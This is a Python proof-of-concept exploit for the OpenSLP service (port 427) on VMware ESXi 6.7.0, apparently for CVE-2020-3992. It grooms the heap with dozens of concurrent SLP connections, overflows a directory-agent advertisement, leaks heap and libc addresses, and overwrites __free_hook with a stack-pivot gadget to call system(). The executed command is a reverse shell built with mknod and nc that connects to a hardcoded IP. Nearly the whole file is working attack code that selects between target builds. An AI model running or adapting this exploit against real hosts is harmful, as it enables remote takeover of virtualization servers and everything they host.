#!/usr/bin/python3

import sys
import time
import trace
import queue
import struct
import socket
import threading

IP = sys.argv[1]
#shell_cmd = b'echo "pwned" > /tmp/pwn'
shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'

DEBUG = False
PRINT = True
LOG_LEAK = False

T = 0.3 #0.4
PORT = 427
COMMAND = 'command'
MARKER = b'\xef\xbe\xad\xde'

LISTEN = 0x65
STREAM_READ = 0x6c
STREAM_WRITE = 0x6f
STREAM_READ_FIRST = 0x6d

LISTEN_FD = 0x8

leaked_data = b'\x00\x00\x00\x00'
leaked_values = None

class SLP_Thread(threading.Thread):
    def __init__(self, input_q):
       super(SLP_Thread, self).__init__()
       self.input_q = input_q

    def run(self):
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       while True:
          try:
             
             data = self.input_q.get(True, 0.05)
             name = threading.current_thread().name.replace('Thread','SLP Client') 
             
             if 'connect' == data[COMMAND]:
                if PRINT:
                   print('[' + name + '] connect')
                s.connect((IP, PORT)) 
             
             elif 'service request' == data[COMMAND]:
                arg1 = data['arg1'] 
                outgoing = self.generate_srv_rqst(arg1)
                if PRINT:
                   print('[' + name + '] service request')
                s.send(outgoing)
                d = s.recv(1024)
                if PRINT:
                   print('[' + name + '] recv: ', d)
 
             elif 'directory agent advertisement' == data[COMMAND]:
                arg1 = data['arg1']
                arg2 = data['arg2']
                outgoing = self.generate_da_advert(arg1, arg2)
                if PRINT:
                   print('[' + name + '] directory agent advertisement')
                s.send(outgoing)
                d = s.recv(1024)
                if PRINT:
                   print('[' + name + '] recv: ', d)
       
             elif 'service registration' == data[COMMAND]:
               arg1 = data['arg1']
               arg2 = data['arg2']
               arg3 = data['arg3']
               arg4 = data['arg4']       
               outgoing = self.generate_srv_reg(arg1, arg2, arg3, arg4)
               if PRINT:
                  print('[' + name + '] service registration')
               s.send(outgoing)
               d = s.recv(1024)
               if PRINT:
                  print('[' + name +'] recv: ', d)

             elif 'attribute request' == data[COMMAND]:
               arg1 = data['arg1']
               arg2 = data['arg2']
               outgoing = self.generate_attrib_rqst(arg1)
               if PRINT:
                  print('[' + name + '] attribute request')
               s.send(outgoing)
               output = b''
               for i in range(0, arg2):
                  output += s.recv(1)
               if PRINT:
                  print('[' + name + '] recv: ', output)
             
             elif 'recv' == data[COMMAND]:
                output = b''
                arg1 = data['arg1']
                arg2 = data['arg2']
                for i in range(0, arg2):
                   output += s.recv(1)
                if arg1:
                   print('[' + name + '] recv: ', output)
             
             elif 'leak data' == data[COMMAND]:
                outgoing = b''
                incoming = b''
                arg1 = data['arg1']   
  
                if arg1 > 0:
                
                   for i in range(0, arg1):
                      outgoing += s.recv(1)

                   #print(outgoing.hex())

                   global leaked_data
                   leaked_data = outgoing            
 
                else:

                   while True:
                      incoming = s.recv(1)
                      outgoing += incoming
                      if MARKER in outgoing:
                         break
                   
                   global leaked_values
                   leaked_values = []

                   try:
                      for i in range(0, len(outgoing), 4):
                         v = struct.unpack('<I', outgoing[i : i+4])[0]
                         leaked_values.append(v)
                   except:
                      pass

             elif 'close' == data[COMMAND]:
                if PRINT:
                   print('[' + name + '] close')
                s.close()
                break
       
          except queue.Empty:
             continue 

    def generate_slp_header(self, payload, functionid, xid, extoffset):
       packetlen = len(payload) + 16
       if extoffset:
          extoffset += 16
       header = bytearray([2, functionid])
       header.extend(struct.pack('!IH', packetlen, 0)[1:])
       header.extend(struct.pack('!IHH', extoffset, xid, 2)[1:])
       header.extend(b'en')
       return header

    def generate_srv_rqst(self, data):
       srvtype = prlist = scopes = predicate = b''
       spi = data
       payload = bytearray(struct.pack('!H', len(prlist)) + prlist)
       payload.extend(struct.pack('!H', len(srvtype)) + srvtype)
       payload.extend(struct.pack('!H', len(scopes)) + scopes)
       payload.extend(struct.pack('!H', len(predicate)) + predicate)
       payload.extend(struct.pack('!H', len(spi)) + spi)
       header = self.generate_slp_header(payload, 1, 5, 0)
       return header + payload

    def generate_da_advert(self, url, scopes):
       error_code = 0
       boot_time = int(time.time())
       attributes = spi = auth_blocks = b''
       payload = bytearray(struct.pack('!H', error_code) + struct.pack('!I', boot_time))
       payload.extend(struct.pack('!H', len(url)) + url)
       payload.extend(struct.pack('!H', len(scopes)) + scopes)
       payload.extend(struct.pack('!H', len(attributes)) + attributes)
       payload.extend(struct.pack('!H', len(spi)) + spi)
       payload.extend(struct.pack('!H', len(auth_blocks)) + auth_blocks)
       header = self.generate_slp_header(payload, 8, 0, 0)
       return header + payload
   
    def generate_url_entry(self, url):
       lifetime = 2 * 60 #seconds
       auth_blocks = b''
       payload = bytearray([0])
       payload.extend(struct.pack('!H', lifetime))
       payload.extend(struct.pack('!H', len(url)) + url)
       payload.extend(struct.pack('!B', len(auth_blocks)) + auth_blocks)
       return payload
   
    def generate_srv_reg(self, url, srvtype, scopes, attributes):
       attrib_auth_blocks = b''
       url_entry = self.generate_url_entry(url)
       payload = bytearray(url_entry)
       payload.extend(struct.pack('!H', len(srvtype)) + srvtype)
       payload.extend(struct.pack('!H', len(scopes)) + scopes)
       payload.extend(struct.pack('!H', len(attributes)) + attributes)
       payload.extend(struct.pack('!B', len(attrib_auth_blocks)) + attrib_auth_blocks)
       header = self.generate_slp_header(payload, 3, 20, 0)
       return header + payload
   
    def generate_attrib_rqst(self, url):
       scopes = b'DEFAULT'
       prlist = tags = spi = b''
       payload = bytearray(struct.pack('!H', len(prlist)) + prlist)
       payload.extend(struct.pack('!H', len(url)) + url)
       payload.extend(struct.pack('!H', len(scopes)) + scopes)
       payload.extend(struct.pack('!H', len(tags)) + tags)
       payload.extend(struct.pack('!H', len(spi)) + spi)
       header = self.generate_slp_header(payload, 6, 12, 0)
       return header + payload

def close():
   time.sleep(T)
   return {'command' : 'close'}

def connect():
   time.sleep(T)
   return {'command' : 'connect'}

def service_request(arg1):
   time.sleep(T)
   return {'command' : 'service request', 'arg1' : arg1}

def da_advert_request(arg1, arg2):
   time.sleep(T)
   return {'command' : 'directory agent advertisement', 'arg1' : arg1, 'arg2' : arg2}

def service_registration(arg1, arg2):
   time.sleep(T)
   return {'command' : 'service registration', 'arg1' : b'127.0.0.1', 'arg2' : arg1, 'arg3' : b'default', 'arg4' : arg2}

def attribute_request(arg1, arg2):
   time.sleep(T)
   return {'command' : 'attribute request', 'arg1' : arg1, 'arg2' : arg2}

def leak_data(arg1 = -1):
   time.sleep(T)
   return {'command' : 'leak data', 'arg1': arg1}

def overflow_and_extend(size, flag):
   arg1 = b'A' * 24
   arg2 = b'B' * 13 + struct.pack('<H', size + flag) + b':/' + b'C' * 647
   return da_advert_request(arg1, arg2)

def update_target_slpdsocket(fd, size, state):
   payload  = b'\xd0\x00\x00\x00'
   payload += b'\x00' * 8 + b'\xbe\xba\xfe\xca'
   payload += struct.pack('<I', fd)
   payload += b'\x00' * 4
   payload += struct.pack('<I', state)
   payload += b'\x00' * 12
   payload += b'\x02\x00\x00\x00'
   payload += b'\x7f\x00\x00\x01'
   payload += b'\x00' * 8
   filler = b'A' * (size - 0x76)
   return service_request(filler + payload)

def partial_update_target_send_buffer(size, send_buffer_size, flag, data):
   payload  = struct.pack('<I', send_buffer_size + flag)
   payload += b'\x00' * 8
   payload += struct.pack('<I', send_buffer_size - 0x20)
   payload += data #b'\x00' * 2
   filler = b'A' * (size - 0x56)
   return service_request(filler + payload)

def update_target_send_buffer(size, send_buffer_size, flag, address, length):
   payload = struct.pack('<I', send_buffer_size + flag)
   payload += b'\x00' * 8
   payload += struct.pack('<I', send_buffer_size - 0x20)
   payload += struct.pack('<I', address) * 2
   payload += struct.pack('<I', address + length)
   payload += b'\x00' * 0x10
   filler = b'A' * (size - 0x66)
   return service_request(filler + payload)

def update_target_recv_buffer(size, address):
   size += 0x1a
   payload  = b'\x40\x00\x00\x00'
   payload += b'\x00' * 8
   payload += struct.pack('<I', size)
   payload += struct.pack('<I', address - 26) * 2 + struct.pack('<I', address - 26 + size)     
   filler = b'A' * 0xca
   return service_request(filler + payload)

def block(size):
   if size > 0x38:
      size = size - 0x38
   else:
      size = 1
   return service_request(b'A' * size)

def breakpoint():
   time.sleep(T)
   input('breakpoint')

def exploit():
   count = 60
   requests = [0]
   slpclients = [0]

   global leaked_data
   global leaked_values

   requests.extend([queue.Queue() for i in range(1, count)])
   slpclients.extend([SLP_Thread(input_q = requests[i]) for i in range(1, count)])

   for i in range(1, count):
      slpclients[i].start()

   requests[1].put(connect())
   requests[1].put(da_advert_request(b'roflmao://pwning', b'BBB'))

   requests[2].put(connect())
   requests[3].put(connect())
   requests[4].put(connect())
   requests[5].put(connect())

   requests[2].put(block(0x40))
   requests[3].put(block(0x40))
   requests[4].put(block(0x40))
   requests[5].put(block(0x40))

   requests[6].put(connect())
   requests[6].put(block(0x810))
   requests[7].put(connect())
   requests[8].put(connect())
   requests[6].put(close())
   requests[9].put(connect())
   requests[9].put(overflow_and_extend(0x140, 0x1))
   fd = 0xc
   requests[8].put(update_target_slpdsocket(fd, 0x140, STREAM_READ_FIRST))
   requests[7].put(service_registration(b'service:pwn', MARKER + b'B' * (0x3200 - 21 - 4)))
   requests[8].put(update_target_slpdsocket(LISTEN_FD, 0x140, LISTEN))
   requests[10].put(connect())
   requests[10].put(block(0x70))

   requests[11].put(connect())
   requests[12].put(connect())
   requests[13].put(connect())
   requests[11].put(block(0x810))
   requests[14].put(connect())
   requests[14].put(block(0x160))
   requests[12].put(block(0x810))
   requests[14].put(close())
   requests[15].put(connect())
   requests[15].put(attribute_request(b'service:pwn', 0x20))

   requests[13].put(block(0x110))
   requests[16].put(connect())
   requests[17].put(connect())

   requests[12].put(close())
   requests[18].put(connect())
   requests[18].put(overflow_and_extend(0x120, 0x3))
   requests[17].put(partial_update_target_send_buffer(0x120, 0x3220, 0x1, b'\x00\x00'))
   requests[19].put(connect())
   requests[19].put(block(0x178))

   requests[11].put(close())
   requests[20].put(connect())
   requests[20].put(overflow_and_extend(0x140, 0x1))
   fd = 0x11
   requests[16].put(update_target_slpdsocket(fd, 0x140, STREAM_WRITE))
   requests[16].put(update_target_slpdsocket(LISTEN_FD, 0x140, LISTEN))
   requests[21].put(connect())
   requests[21].put(block(0x178))
   requests[15].put(leak_data())

   time.sleep(T + 1.0)

   heap_address = 0
   libc_base_address = 0

   if leaked_values == None:
      print("[-] Exploit Failed [-]")
      return -1

   leaked_values = leaked_values[::-1]

   if LOG_LEAK:  
      for i in leaked_values:
         print(hex(i))
 
   if leaked_values[0] == 0xdeadbeef:
      heap_address = leaked_values[6] - 0x3220 + 0x4
     
   elif leaked_values[0] == 0xefeb3174:
      heap_offset = 0x2b1 if leaked_values[42] == 0x42424242 else 0x5d61
      heap_address = leaked_values[14] + heap_offset
   
   libc_leak_location = heap_address - 0x100 + 4
      
   requests[22].put(connect())
   requests[22].put(block(0x810))
   requests[23].put(connect())
   requests[23].put(block(0x100))
   requests[24].put(connect())
   requests[24].put(block(0x810))
   requests[23].put(close())
   requests[25].put(connect())
   requests[25].put(block(0x698))

   requests[27].put(connect())
   requests[28].put(connect())

   requests[24].put(close())
   requests[26].put(connect())
   requests[26].put(overflow_and_extend(0x130, 0x1))
   requests[27].put(update_target_send_buffer(0x130, 0x598, 0x1, libc_leak_location, 0x4))
   requests[29].put(connect())
   requests[29].put(block(0x178))
   
   requests[22].put(close())
   requests[30].put(connect())
   requests[30].put(overflow_and_extend(0x140, 0x1)) 
   fd = 0x15
   requests[28].put(update_target_slpdsocket(fd, 0x140, STREAM_WRITE))
   requests[28].put(update_target_slpdsocket(LISTEN_FD, 0x140, LISTEN))
   requests[31].put(connect())
   requests[31].put(block(0x178))
   requests[25].put(leak_data(0x4))
 
   time.sleep(T + 1.0)
   libc_base_address = struct.unpack('<I', leaked_data)[0] - 0x193568

   libc_ret_offset = 0x0008009c
   libc_system_offset = 0x0003e390
   libc_environ_offset = 0x00194e20
   libc___free_hook_offset = 0x001948d8
   libc_ret_address = libc_base_address + libc_ret_offset
   libc_system_address = libc_base_address + libc_system_offset
   libc_environ_address = libc_base_address + libc_environ_offset
   libc___free_hook_address = libc_base_address + libc___free_hook_offset
   shell_cmd_address = heap_address + 0x34

   gadget_offset = 0x0007fe01 # add esp, 0x100 ; ret
   gadget_address = libc_base_address + gadget_offset

   requests[27].put(update_target_send_buffer(0x130, 0x598, 0x1, libc_environ_address, 0x4))
   requests[28].put(update_target_slpdsocket(fd, 0x140, STREAM_WRITE))
   requests[25].put(leak_data(0x4))
 
   time.sleep(T + 1.0)
   stack_environ_address =  struct.unpack('<I', leaked_data)[0]
   esp_offset = 0xe30 if sys.argv[2] == '1' else 0xe7c
   esp_value = stack_environ_address - esp_offset
   pivoted_esp_value = esp_value + 0x100

   print()
   print('[+] libc base address: ', hex(libc_base_address))
   print("[+] libc system address: ", hex(libc_system_address))
   print("[+] libc environ address: ", hex(libc_environ_address))
   print("[+] libc __free_hook address: ", hex(libc___free_hook_address))
   print("[+] ret address: ", hex(libc_ret_address))
   print("[+] gadget address: ", hex(gadget_address))
   print('[+] heap address: ', hex(heap_address))
   print("[+] shell command address: ", hex(shell_cmd_address))
   print("[+] stack enviorn address: ", hex(stack_environ_address))
   print("[+] esp value: ", hex(esp_value))
   print("[+] pivoted esp value: ", hex(pivoted_esp_value))
   print()

   requests[28].put(update_target_slpdsocket(LISTEN_FD, 0x140, LISTEN))
   
   requests[32].put(connect())
   requests[32].put(block(0x810))
   requests[33].put(connect())
   requests[34].put(connect())
   requests[34].put(block(0x810))
   requests[33].put(block(0x100))
  
   requests[35].put(connect())
   requests[36].put(connect())

   requests[34].put(close())
   requests[37].put(connect())
   requests[37].put(overflow_and_extend(0x120, 0x3))
   requests[36].put(update_target_recv_buffer(0x4, shell_cmd_address))
   requests[38].put(connect())
   requests[38].put(block(0x178))
   
   requests[32].put(close())
   requests[39].put(connect())
   requests[39].put(overflow_and_extend(0x140, 0x1))
   requests[35].put(update_target_slpdsocket(LISTEN_FD, 0x140, LISTEN))
   requests[40].put(connect())
   requests[40].put(block(0x178))   

   fd = 0x1a
   payload = shell_cmd + b'\x00'
   requests[36].put(update_target_recv_buffer(len(payload), shell_cmd_address))
   requests[35].put(update_target_slpdsocket(fd, 0x140, STREAM_READ))
   requests[33].put(service_request(payload))
   
   payload = struct.pack('<I', libc_ret_address) * 10 + struct.pack('<I', libc_system_address) + b'\x41' * 4 + struct.pack('<I', shell_cmd_address)
   requests[36].put(update_target_recv_buffer(len(payload), pivoted_esp_value - 0x10)) 
   requests[35].put(update_target_slpdsocket(fd, 0x140, STREAM_READ))
   requests[33].put(service_request(payload))
   
   #breakpoint()
   
   payload = b'\x41\x41\x41\x41' if DEBUG == True else struct.pack('<I', gadget_address)
   requests[36].put(update_target_recv_buffer(len(payload), libc___free_hook_address))
   requests[35].put(update_target_slpdsocket(fd, 0x140, STREAM_READ))
   requests[33].put(service_request(payload))

   time.sleep(T + 1.0) 
   print('[*] exploit deployed')
   return 0

def intro():
   print("   _____   _____   ___ __ ___ _    ___ _ ___ ____ _ _       ")
   print("  / __\ \ / / __|_|_  )  \_  ) |__|_  ) / _ \__  | | |      ")
   print(" | (__ \ V /| _|___/ / () / /| |___/ /| \_, / / /|_  _|     ")
   print("  \___| \_/ |___| /___\__/___|_|  /___|_|/_/ /_/   |_|      ")
   print()
   print("                       PoC Exploit                          ")
   print()
   print("      vuln discovered by: Lucas Leong (@_wmliang_)          ")
   print("           poc by: Johnny Yu (@straight_blast)              ")
   print("                                                            ")
   print()
   print("           currently support the following:                 ")
   print("         [1] VMware ESXi 6.7.0 build-14320388               ")
   print("         [2] VMware ESXi 6.7.0 build-16316930               ")
   print()

if __name__ == '__main__':
   intro()   
   exploit()
